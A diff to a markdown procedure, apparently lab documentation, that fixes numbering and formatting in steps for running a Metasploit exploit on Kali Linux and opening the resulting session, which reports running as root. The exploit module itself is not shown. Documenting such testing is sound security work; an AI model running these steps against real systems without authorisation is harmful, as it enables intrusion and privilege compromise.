@@ -47,12 +47,10 @@ This procedure was tested on Kali Linux 22.04 using Metasploit Framework 6.4.2-d
     > set target 1
     > exploit
     ```
-Note: MSF will claim that the exploit fails, but the session is still created. Not sure why this happens.
-5. Open the session (in this example, it is session 1) and test to see which user this payload is running as
+    Note: MSF will claim that the exploit fails, but the session is still created. Not sure why this happens.
+4. Open the session (in this example, it is session 1) and test to see which user this payload is running as.
     ```
     > sessions -i 1
-    ```
-    ```
     > show guid
     root
     ```
